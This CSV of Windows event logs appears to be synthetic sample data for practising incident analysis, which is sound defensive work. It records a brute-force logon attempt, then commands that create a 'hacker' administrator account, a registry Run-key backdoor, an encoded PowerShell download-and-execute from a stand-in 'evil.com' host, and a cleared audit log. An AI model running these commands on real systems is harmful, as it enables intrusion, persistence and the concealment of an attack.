TimeCreated,EventID,MachineName,Message
2026-05-01 08:00:01,4624,WORKSTATION01,"An account was successfully logged on. Subject: WORKSTATION01\alice. Logon Type: 2."
2026-05-01 08:05:33,4625,WORKSTATION01,"An account failed to log on. Account Name: administrator. Failure Reason: Unknown user name or bad password. Source IP: 10.0.0.77"
2026-05-01 08:05:35,4625,WORKSTATION01,"An account failed to log on. Account Name: administrator. Failure Reason: Unknown user name or bad password. Source IP: 10.0.0.77"
2026-05-01 08:05:37,4625,WORKSTATION01,"An account failed to log on. Account Name: administrator. Failure Reason: Unknown user name or bad password. Source IP: 10.0.0.77"
2026-05-01 08:05:39,4625,WORKSTATION01,"An account failed to log on. Account Name: administrator. Failure Reason: Unknown user name or bad password. Source IP: 10.0.0.77"
2026-05-01 08:05:41,4625,WORKSTATION01,"An account failed to log on. Account Name: administrator. Failure Reason: Unknown user name or bad password. Source IP: 10.0.0.77"
2026-05-01 08:05:43,4625,WORKSTATION01,"An account failed to log on. Account Name: administrator. Failure Reason: Unknown user name or bad password. Source IP: 10.0.0.77"
2026-05-01 08:10:00,4740,WORKSTATION01,"A user account was locked out. Account Name: administrator. Source IP: 10.0.0.77"
2026-05-01 08:15:00,4688,WORKSTATION01,"A new process has been created. Process Name: C:\Windows\System32\cmd.exe /c net user hacker P@ssw0rd /add"
2026-05-01 08:15:05,4688,WORKSTATION01,"A new process has been created. Process Name: cmd.exe. Command: net localgroup administrators hacker /add"
2026-05-01 08:16:00,4657,SERVER01,"A registry value was modified. Key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run Value: Backdoor Data: C:\temp\malware.exe"
2026-05-01 08:17:00,4688,SERVER01,"A new process has been created. Command: powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcwBoAGUAbABsACcAKQA="
2026-05-01 08:20:00,1102,SERVER01,"The audit log was cleared. Subject: DOMAIN\attacker"
2026-05-01 09:00:00,4624,SERVER01,"An account was successfully logged on. Subject: DOMAIN\bob. Logon Type: 3."
2026-05-01 09:30:00,4688,WORKSTATION02,"A new process has been created. Process Name: C:\Windows\System32\wbem\wmic.exe. Command: wmic process call create 'calc.exe'"
